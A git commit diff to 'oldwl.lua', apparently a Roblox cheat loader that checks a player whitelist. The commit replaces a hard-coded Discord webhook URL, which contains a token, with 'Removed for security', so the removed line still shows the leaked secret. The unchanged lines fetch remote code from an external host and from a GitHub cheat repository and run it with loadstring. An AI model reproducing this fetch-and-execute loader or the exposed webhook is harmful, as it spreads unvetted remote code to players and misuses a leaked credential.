22348bb6140a944859a8d9237534d43bc64a535c
helplynch <108618400+helplynch@users.noreply.github.com>
2023-10-14 12:13:37 -0400

    Update oldwl.lua

--- oldwl.lua
+++ oldwl.lua
@@ -2,7 +2,7 @@ local username = game.Players.LocalPlayer.Name
 local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()
 if players[username] == true then
 	print("loading assware for " .. username)
-	local url = "https://discord.com/api/webhooks/1162210538852450334/z0yFuSUNlm8vvVzsJQWvVOhGX1e58HU9HT841I-_VZg0EG_3ke5ggoOiyr1iov5DOZZ0"
+	local url = "Removed for security"
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/gdmsg.lua"))()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/v3.lua"))()
 else
